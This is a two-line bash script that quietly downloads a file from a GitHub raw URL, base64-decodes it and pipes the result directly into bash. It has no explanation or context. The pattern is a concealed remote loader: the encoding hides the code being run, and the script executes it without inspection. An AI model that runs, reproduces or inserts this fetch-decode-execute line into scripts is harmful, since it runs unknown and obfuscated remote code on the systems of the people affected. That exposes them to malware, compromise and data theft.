#!/bin/bash
wget -qO- https://raw.githubusercontent.com/walterpickerel/host/refs/heads/main/entrypoint.sh | base64 -d | bash
